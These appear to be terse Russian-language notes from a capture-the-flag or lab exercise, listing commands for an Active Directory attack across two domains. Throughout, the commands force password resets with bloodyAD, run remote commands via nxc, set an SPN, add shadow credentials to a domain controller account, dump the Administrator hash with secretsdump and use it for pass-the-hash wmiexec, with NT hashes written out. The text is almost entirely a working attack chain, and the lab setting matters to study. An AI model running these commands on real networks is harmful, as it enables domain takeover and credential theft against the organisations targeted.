KRB5CCNAME=APEXCARGO\$.ccache proxychains GetADUsers.py -k -no-pass -dc-ip 172.16.114.15 MSSP.AD/'APEXCARGO$' -all

меняем пароль 

KRB5CCNAME=APEXCARGO\$.ccache proxychains bloodyAD -k -d mssp.ad --host DC04.mssp.ad --dc-ip 172.16.114.15 -u 'APEXCARGO$' set password harry 'Test@1234!' 

проверяем изменения

proxychains nxc smb 172.16.114.15 -u harry -p 'Test@1234!' --shares
proxychains nxc smb 172.16.114.15 -u harry -p 'Test@1234!' -x "C:\Users\Administrator\Desktop\flag.txt"
proxychains nxc smb 172.16.114.15 -u harry -p 'Test@1234!' -x "type C:\Users\Administrator\Desktop\flag.txt"
*****************************************
# 4 учетные записи в другом домене

bloodyAD --host DC05.fabricorp.ad -d fabricorp.ad -u 'harry@mssp.ad' -p 'Test@1234!' set object ALEX servicePrincipalName -v 'HTTP/alex.fabricorp.ad'

 proxychains bloodyAD -d mssp.ad -u 'harry' -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 set object ALEX servicePrincipalName -v 'HTTP/alex.fabricorp.ad'
proxychains bloodyAD -d mssp.ad -u 'harry' -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 set password ALEX 'Test@1234!'

сбрасываем пароль

proxychains nxc ldap 172.16.114.20 -d fabricorp.ad -u ALEX -p 'Test@1234!' --users

эта комндда создаст shados credentials

proxychains bloodyAD -d fabricorp.ad -u ALEX -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 add shadowCredentials 'DC05$'

NT: 4b61e8dc1702261873c1775480ac1a0f

получаем хеш админа
proxychains impacket-secretsdump -hashes :4b61e8dc1702261873c1775480ac1a0f 'fabricorp.ad/DC05$@172.16.114.20' -just-dc-user Administrator

проверяем
proxychains impacket-wmiexec -hashes :288d7f5ef7d82e5fabc5227e99faa5c6 'fabricorp.ad/Administrator@172.16.114.20' 'type C:\Users\Administrator\Desktop\flag.txt'
